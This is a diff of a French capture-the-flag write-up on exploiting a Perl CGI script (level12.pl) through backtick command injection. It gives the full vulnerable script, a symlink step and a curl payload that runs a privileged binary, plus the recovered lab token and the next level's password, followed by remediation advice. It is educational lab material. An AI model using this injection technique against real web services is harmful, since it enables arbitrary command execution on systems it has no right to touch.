@@ -1,81 +1,155 @@
-Voici le README adapté au même format que précédemment :
+# Rapport de Vulnérabilité : Injection de Commande Perl via CGI
 
----
+## Description
+Cette vulnérabilité exploite une injection de commandes via un script Perl CGI (`level12.pl`) accessible localement via un serveur web tournant sur le port 4646. Le script utilise les entrées utilisateur sans filtrage adéquat dans une commande système (`egrep`). En exploitant cette vulnérabilité, il est possible d'exécuter arbitrairement des commandes shell avec les privilèges de l'utilisateur flag12 et ainsi récupérer le token pour passer au niveau suivant.
 
-## Rapport de Vulnérabilité : Injection de Commande Perl via CGI
+## Comment Exploiter la Faille
 
-### Description
+### Étape 1 : Analyse du script vulnérable
 
-Cette vulnérabilité exploite une injection de commandes via un script Perl CGI (`level12.pl`) accessible localement via un serveur web tournant sur le port 4646. Le script utilise les entrées utilisateur sans filtrage adéquat dans une commande système (`egrep`). En exploitant cette vulnérabilité, il est possible d’exécuter arbitrairement des commandes shell avec les privilèges de l’utilisateur flag12 et ainsi récupérer le token pour passer au niveau suivant.
-
----
-
-### Comment Exploiter la Faille
-
-**Étape 1 : Analyse du script vulnérable**
-Le script Perl utilise la fonction suivante :
-
+**Code complet du script `level12.pl` :**
 ```perl
-@output = `egrep "^$xx" /tmp/xd 2>&1`;
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/; 
+  $xx =~ s/\s.*//;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }    
+}
+n(t(param("x"), param("y")));
 ```
 
-* `$xx` provient directement d’un paramètre utilisateur via CGI (`param("x")`), sans filtrage suffisant.
-* Ceci permet l’injection de commandes arbitraires en utilisant des backticks ou d'autres mécanismes d’exécution.
+**Points clés d'analyse :**
+- Le paramètre `x` subit deux transformations :
+  1. `$xx =~ tr/a-z/A-Z/;` → Conversion en majuscules
+  2. `$xx =~ s/\s.*//;` → Suppression de tout après le premier espace
+- La vulnérabilité se trouve dans : `@output = `egrep "^$xx" /tmp/xd 2>&1`;`
+- `$xx` est injecté directement dans la commande système sans échappement
 
-**Étape 2 : Préparation d'une requête malveillante**
-Pour exécuter la commande `getflag`, il suffit d’envoyer une requête HTTP contenant une injection via le paramètre `x` :
+### Étape 2 : Contournement des restrictions
 
-```shell
+**Problème :** Les transformations du script limitent notre payload :
+- Majuscules uniquement
+- Tout après un espace est supprimé
+
+**Solution :** Utiliser le caractère wildcard `*` qui n'est pas affecté par ces transformations et permet de contourner les restrictions de chemin.
+
+### Étape 3 : Préparation de l'exploitation
+
+**Création du lien symbolique :**
+```bash
 ln -s /bin/getflag /tmp/GETFLAG
-
-curl 'http://localhost:4646/level12.pl?x="%60/*/getflag>%262%60"'
 ```
 
-* `%60` est le codage URL du caractère backtick (`` ` ``).
-* `/*/getflag` contourne des restrictions de chemin pour appeler explicitement le binaire `getflag`.
-* `>%262` redirige la sortie vers le flux d’erreurs standard (stderr, codé `%26` qui représente le caractère `&`).
+Cette étape est cruciale car elle permet de créer un lien vers `getflag` avec un nom en majuscules, compatible avec la transformation du script.
 
-**Étape 3 : Récupération du flag**
-Le résultat du flag est enregistré dans les logs d’erreurs Apache. Affichez-les ainsi :
+### Étape 4 : Exécution de l'attaque
 
-```shell
+**Payload d'injection :**
+```bash
+curl 'http://localhost:4646/level12.pl?x="%60/*/GETFLAG>%262%60"'
+```
+
+**Décomposition du payload :**
+- `%60` = backtick (`) encodé en URL
+- `/*/GETFLAG` = utilise le wildcard `*` pour contourner les restrictions
+- `>%262` = redirige vers stderr (`%26` = `&`, `2` = stderr)
+- Le tout est encadré de backticks pour exécution de commande
+
+**Mécanisme d'exploitation :**
+1. Le script transforme le payload : `%60/*/GETFLAG>%262%60` → `/*/GETFLAG>&2`
+2. Les backticks décodés provoquent l'exécution : `egrep "^`/*/GETFLAG>&2`" /tmp/xd`
+3. La commande `/tmp/GETFLAG` (via le lien symbolique) s'exécute et redirige vers stderr
+
+### Étape 5 : Récupération du flag
+
+**Consultation des logs d'erreur Apache :**
+```bash
 cat /var/log/apache2/error.log
 ```
 
-Vous obtenez alors le flag :
-
+**Résultat obtenu :**
 ```
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
 
-**Étape 4 : Passage au niveau suivant**
-Utilisez ce token pour passer à l'utilisateur suivant :
+**Flag obtenu :**
+```
+g1qKMiRpXf53AWhDaU7FEkczr
+```
 
-```shell
+### Étape 6 : Passage au niveau suivant
+
+```bash
 su level13
-Mot de passe : g1qKMiRpXf53AWhDaU7FEkczr
+```
+**Mot de passe :**
+```
+g1qKMiRpXf53AWhDaU7FEkczr
 ```
 
 ---
 
-### Comment Résoudre la Faille
+## Mécanisme détaillé de l'exploitation
 
-1. **Validation stricte des entrées utilisateur :**
+### Transformation des données :
+1. **Input original :** `"%60/*/GETFLAG>%262%60"`
+2. **Après décodage URL :** `` `/*/GETFLAG>&2` ``
+3. **Après tr/a-z/A-Z/ :** `` `/*/GETFLAG>&2` `` (pas de changement)
+4. **Après s/\s.*// :** `` `/*/GETFLAG>&2` `` (pas d'espace, pas de changement)
+5. **Injection finale :** `egrep "^`/*/GETFLAG>&2`" /tmp/xd`
 
-   * Toujours valider et filtrer les entrées CGI avant de les utiliser dans une commande système.
-   * Utilisez des modules Perl spécifiques qui assurent l’échappement approprié des caractères spéciaux (par exemple, `quotemeta()` ou équivalents).
-
-2. **Ne pas appeler directement des commandes shell avec entrées non validées :**
-
-   * Évitez l’utilisation de backticks sur les entrées utilisateur.
-   * Si l’appel est nécessaire, utilisez les formes sécurisées d’exécution de commande (par exemple, `open()` avec liste de paramètres explicite).
-
-3. **Séparer les privilèges :**
-
-   * N’exécutez pas les scripts CGI avec des privilèges élevés inutilement.
+### Exécution de la commande injectée :
+- Le shell exécute d'abord la commande entre backticks : `/*/GETFLAG>&2`
+- Le wildcard `*` se résout vers `/tmp/GETFLAG` (notre lien symbolique)
+- `getflag` s'exécute et sa sortie est redirigée vers stderr
+- Le résultat de `getflag` remplace les backticks dans la commande `egrep`
 
 ---
 
-### Conclusion
+## Comment Résoudre la Faille
 
-Cette vulnérabilité souligne l’importance critique d’un contrôle rigoureux des entrées utilisateurs lorsqu'elles sont utilisées dans des commandes système. L’absence de filtrage permet facilement à un attaquant d’exécuter des commandes arbitraires avec des privilèges élevés, conduisant à une escalade rapide des privilèges.
+Pour corriger cette vulnérabilité :
+
+* **Validation stricte des entrées utilisateur :**
+  - Utiliser des listes blanches de caractères autorisés
+  - Rejeter toute entrée contenant des caractères spéciaux shell
+
+* **Échappement sécurisé :**
+  - Utiliser `quotemeta()` pour échapper les métacaractères
+  - Implémenter un filtrage strict des backticks, pipes, redirections
+
+* **Éviter l'exécution de commandes avec entrées utilisateur :**
+  - Remplacer les backticks par des appels système sécurisés
+  - Utiliser `open()` avec liste de paramètres explicites
+
+**Code sécurisé suggéré :**
+```perl
+use File::Basename;
+$xx = quotemeta($xx);  # Échappement sécurisé
+# Ou mieux : utiliser une approche sans appel système
+```
+
+## Conclusion
+
+Cette vulnérabilité illustre parfaitement les dangers de l'injection de commandes dans les applications web CGI. Malgré les transformations appliquées aux entrées (majuscules, suppression d'espaces), l'utilisation du wildcard `*` et des redirections permet de contourner ces protections rudimentaires. Une validation stricte et un échappement approprié des entrées utilisateur sont essentiels pour prévenir ce type d'exploitation.
+
+---
